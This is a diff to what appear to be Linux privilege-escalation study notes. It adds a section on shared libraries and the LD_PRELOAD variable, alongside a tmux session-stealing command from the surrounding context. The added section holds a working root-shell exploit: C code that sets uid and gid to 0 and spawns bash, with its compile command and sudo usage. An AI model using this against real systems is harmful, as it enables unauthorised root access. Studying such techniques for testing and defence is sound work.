@@ -292,3 +292,32 @@ ls -la /shareds
 # Steal session
 tmux -S /shareds
 ```
+
+## Shared Libraries
+In linux *Static libraries* are denoted with a `.a` extension, whereas *Dynamically linked shared object libraries* are denoted with `.so`. 
+
+When compiled, *static libraries* become part of the program and cannot be altered, whereas dynamically linked libraries aren't and can be modified to control execution of the program that calls them.
+
+The location of dynamic libraries can be specified in many ways, `-rpath` or `-rpath-link` flags at compile time, `LD_RUN_PATH` or `LD_LIBRARY_PATH` env vars, or placing the libs in `/lib` or `/usr/lib` (*default directories*), or specifying a directory in `/etc/ld.so.conf`.
+
+The `LD_PRELOAD` env var can load a library before binary execution, giving a preference over the default ones. We can view all required shared objects for a binary with `ldd [binary]`.
+
+We maybe able to exploit the `LD_PRELOAD` env var with `sudo` to gain privileges.
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() 
+{ 
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/bash");
+}
+```
+```bash
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+```
+Then if we can set the `LD_PRELOAD=root.so` and we can call a binary as root (eg. through `sudo`) we might be able to escalate privileges.
